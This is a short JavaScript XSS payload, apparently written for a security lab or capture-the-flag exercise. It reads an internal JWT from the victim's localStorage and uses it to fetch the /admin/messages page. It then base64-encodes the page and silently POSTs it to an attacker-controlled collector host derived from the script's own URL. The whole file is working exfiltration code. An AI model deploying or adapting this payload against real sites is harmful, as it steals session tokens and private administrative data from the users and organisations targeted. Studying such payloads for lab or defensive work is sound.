(function exfiltrateMessagesWithJwt() {
  const currentScript = document.currentScript;
  const scriptUrl = currentScript ? new URL(currentScript.src) : null;

  if (!scriptUrl) {
    return;
  }

  const token = localStorage.getItem('gym_internal_token');
  if (!token) {
    return;
  }

  const exfilHost = scriptUrl.hostname;
  const exfilProtocol = scriptUrl.protocol;
  const exfilPort = scriptUrl.searchParams.get('collectPort') || '9000';
  const exfilPath = scriptUrl.searchParams.get('collectPath') || '/internal-html';
  const exfilUrl = `${exfilProtocol}//${exfilHost}:${exfilPort}${exfilPath}`;

  fetch('/admin/messages', {
    headers: {
      Authorization: `Bearer ${token}`
    }
  })
    .then((response) => response.text())
    .then((html) => {
      const b64 = btoa(unescape(encodeURIComponent(html)));

      return fetch(exfilUrl, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'text/plain' },
        body: b64
      });
    })
    .catch(() => {
      // Keep the lab payload quiet if the exfiltration target is unavailable.
    });
})();
